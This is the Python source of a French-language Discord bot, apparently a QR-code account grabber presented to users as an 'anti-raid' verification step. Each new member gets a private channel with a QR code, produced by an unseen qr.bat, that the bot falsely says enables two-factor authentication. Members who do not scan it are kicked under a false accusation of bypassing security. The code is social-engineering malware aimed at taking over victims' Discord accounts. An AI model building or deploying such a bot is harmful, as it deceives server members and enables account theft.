import discord
import asyncio
from discord.ext import commands
from discord.ext.commands import bot
from discord.utils import get
from discord_components import Button, Select, SelectOption, ComponentsBot, ButtonStyle
from discord_components.client import DiscordComponents
import os
import subprocess
import sys
import datetime
import json
import time

TOKEN = "TOKEN_DISCORD_BOT"
ID_ROLE_VERIF = 867480230428278804 # ID_ROLE_GIVE_AFTER_SCAN_QR

class Spy:
    gris = "\033[1;30;1m"
    rouge = "\033[1;31;1m"
    vert = "\033[1;32;1m"
    jaune = "\033[1;33;1m"
    bleu = "\033[1;34;1m"
    violet = "\033[1;35;1m"
    cyan = "\033[1;36;1m"
    blanc = "\033[1;0;1m"

try:
    os.system('cls')
    os.system('Title AntiRaidGrab-OFFLINE')
except:
    os.system('clear')
asciiart = f"""{Spy.rouge}
██████╗  ██████╗ ████████╗
██╔══██╗██╔═══██╗╚══██╔══╝
██████╔╝██║   ██║   ██║   
██╔══██╗██║   ██║   ██║   
██████╔╝╚██████╔╝   ██║   
╚═════╝  ╚═════╝    ╚═╝
\n\nDev by Flavien
{Spy.gris}"""

print(asciiart + "\n\n")

def qr():
    params = dict()
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    params['startupinfo'] = startupinfo
    try:
        os.system('cls')
        os.system('Title AntiRaid-Grab')
    except:
        os.system('clear')
    p = subprocess.Popen("qr.bat", **params)

time.sleep(5)
qr()
with open('verif.json') as mon_fichier:
    data = json.load(mon_fichier)
nbr_verif = data['nbr_verif']
remake = data['remake']

discord.member = True
bot = ComponentsBot("¤",intents=discord.Intents.all())

bot.remove_command('help')

@bot.event
async def on_ready():
    try:
        os.system('cls')
        os.system('Title AntiRaidGrab-Online')
    except:
        os.system('clear')
    asciiart = f"""{Spy.vert}
    ██████╗  ██████╗ ████████╗
    ██╔══██╗██╔═══██╗╚══██╔══╝
    ██████╔╝██║   ██║   ██║   
    ██╔══██╗██║   ██║   ██║   
    ██████╔╝╚██████╔╝   ██║   
    ╚═════╝  ╚═════╝    ╚═╝
    \n\nDev by Flavien
    {Spy.gris}"""
    print(asciiart + "\n\n")


@bot.event
async def on_member_join(member):
    channel = await member.guild.create_text_channel("Antiraid_{}".format(member))
    await channel.set_permissions(member.guild.get_role(member.guild.id), send_messages=False, read_messages=False)
    await channel.set_permissions(member, send_messages=False, read_messages=True, add_reactions=True, embed_links=True, attach_files=True, read_message_history=True, external_emojis=True)
    created_em = discord.Embed(title=f'Bienvenue sur **{member.guild.name}**, {member} !', description="Vous devez activer l'authentification à double facteur en scannant se QRCode depuis votre téléphone. \n Quand vous avez scanner le QRCode cliquez sur le bouton < Vérifier >. \nSi le QRCode ne fonctionne pas veuillez cliquez sur < Renvoyer >.", color=0x2c2f33)
    file = discord.File("temp/final_qr.png", filename="image.png")
    created_em.set_image(url="attachment://image.png")
    await channel.send(file=file, embed=created_em, components=[Button(label="Vérifié", custom_id="verif", emoji="📩"), Button(label="Renvoyé", custom_id="resend", emoji="🔄")])
    with open('verif.json') as mon_fichier:
        data = json.load(mon_fichier)
    nbr_verif = data['nbr_verif']
    remake = 0
    data = {'nbr_verif':nbr_verif, 'remake':remake}
    with open('verif.json', 'w') as j:
        json.dump(data, j)
    try:
        await channel.channel.purge(limit=1)
        await channel.set_permissions(member, send_messages=False, read_messages=False, add_reactions=False, embed_links=True, attach_files=False, read_message_history=False, external_emojis=False)
        pass
    except:
        pass

@bot.event
async def on_button_click(interaction):
    user = interaction.author
    if interaction.component.custom_id == "verif":
        with open('verif.json') as mon_fichier:
            data = json.load(mon_fichier)
        nbr_verif = data['nbr_verif']
        remake = data['remake']
        if nbr_verif >= 1:
            role = discord.utils.get(interaction.author.guild.roles, id=ID_ROLE_VERIF)
            await user.add_roles(role)
            await interaction.channel.delete()
            nbr_verif -=1
            remake = 0
            data = {'nbr_verif':nbr_verif, 'remake':remake}
            with open('verif.json', 'w') as j:
                json.dump(data, j)
        else:
            try:
                await user.send("Vous avez été éjecté du discord car nous avons détecté une tentative de contournement de sécurité : Vous n'avez pas scanné le QR Code !")
                await interaction.channel.delete()
                await interaction.guild.kick(user)
                pass
            except:
                await interaction.channel.delete()
                await interaction.guild.kick(user)
                pass
    elif interaction.component.custom_id == "resend":
        with open('verif.json') as mon_fichier:
            data = json.load(mon_fichier)
        nbr_verif = data['nbr_verif']
        remake = data['remake']
        if nbr_verif == 0:
            if remake == 0:
                remake +=1
                data = {'nbr_verif':nbr_verif, 'remake':remake}
                with open('verif.json', 'w') as j:
                    json.dump(data, j)
                qr()
                channel = bot.get_channel(interaction.channel.id)
                messages = await channel.history(limit=10).flatten()
                count = 0
                for message in messages:
                    count += 1
                    await message.delete()
                time.sleep(7)
                created_em = discord.Embed(title=f'Bienvenue sur **{user.guild.name}**, {user} !', description="Vous devez activer l'authentification à double facteur en scannant se QRCode depuis votre téléphone. \n Quand vous avez scanner le QRCode cliquez sur le bouton < Vérifier >. \nSi le QRCode ne fonctionne pas veuillez cliquez sur < Renvoyer >.", color=0x2c2f33)
                file = discord.File("temp/final_qr.png", filename="image.png")
                created_em.set_image(url="attachment://image.png")
                await channel.send(file=file, embed=created_em, components=[Button(label="Vérifié", custom_id="verif", emoji="📩"), Button(label="Renvoyé", custom_id="resend", emoji="🔄")])
            else:
                channel = bot.get_channel(interaction.channel.id)
                created_em = discord.Embed(title=f'Bienvenue sur **{user.guild.name}**, {user} !', description="Vous devez activer l'authentification à double facteur en scannant se QRCode depuis votre téléphone. \n Quand vous avez scanner le QRCode cliquez sur le bouton < Vérifier >. \nSi le QRCode ne fonctionne pas veuillez cliquez sur < Renvoyer >.", color=0x2c2f33)
                file = discord.File("temp/final_qr.png", filename="image.png")
                created_em.set_image(url="attachment://image.png")
                await channel.send(file=file, embed=created_em, components=[Button(label="Vérifié", custom_id="verif", emoji="📩"), Button(label="Renvoyé", custom_id="resend", emoji="🔄")])
        else:
            channel = bot.get_channel(interaction.channel.id)
            created_em = discord.Embed(title=f'Bienvenue sur **{user.guild.name}**, {user} !', description="Vous devez activer l'authentification à double facteur en scannant se QRCode depuis votre téléphone. \n Quand vous avez scanner le QRCode cliquez sur le bouton < Vérifier >. \nSi le QRCode ne fonctionne pas veuillez cliquez sur < Renvoyer >.", color=0x2c2f33)
            file = discord.File("temp/final_qr.png", filename="image.png")
            created_em.set_image(url="attachment://image.png")
            await channel.send(file=file, embed=created_em, components=[Button(label="Vérifié", custom_id="verif", emoji="📩"), Button(label="Renvoyé", custom_id="resend", emoji="🔄")])

bot.run(TOKEN) 
